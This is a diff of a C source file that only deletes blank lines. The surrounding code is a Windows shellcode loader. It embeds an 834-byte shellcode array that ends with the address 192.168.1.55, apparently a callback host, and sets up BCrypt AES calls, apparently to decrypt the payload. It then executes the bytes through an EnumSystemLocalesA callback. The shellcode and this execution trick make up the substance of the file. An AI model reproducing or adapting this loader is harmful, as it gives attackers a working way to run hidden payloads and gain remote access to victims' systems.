@@ -9,7 +9,6 @@
 
 #pragma comment(lib, "Bcrypt.lib")
 
-
 static const BYTE rgbRawData[834] = {
 	0xFC, 0xE8, 0x89, 0x00, 0x00, 0x00, 0x60, 0x89, 0xE5, 0x31, 0xD2, 0x64,
 	0x8B, 0x52, 0x30, 0x8B, 0x52, 0x0C, 0x8B, 0x52, 0x14, 0x8B, 0x72, 0x28,
@@ -82,7 +81,6 @@ static const BYTE rgbRawData[834] = {
 	0xFF, 0x31, 0x39, 0x32, 0x2E, 0x31, 0x36, 0x38, 0x2E, 0x31, 0x2E, 0x35,
 	0x35, 0x00, 0x12, 0x34, 0x56, 0x78
 };
-
 
 #define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
 #define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
@@ -229,7 +227,6 @@ void Run(PBYTE pbCipherText, DWORD cbCipherText)
 
     EnumSystemLocalesA((LOCALE_ENUMPROCA)pbRawData, 0);
 
-
 Cleanup:
 
     if (hAesAlg)
@@ -261,7 +258,6 @@ Cleanup:
     {
         HeapFree(GetProcessHeap(), 0, pbIV);
     }
-
 }
 
 /* =================================================== Loader ================================================ */
@@ -366,8 +362,6 @@ void main()
         wprintf(L"**** Error 0x%x returned by BCryptSetProperty\n", status);
         goto Cleanup;
     }
-
-
 
     // Generate the key from supplied input key bytes.
     if (!NT_SUCCESS(status = BCryptGenerateSymmetricKey(
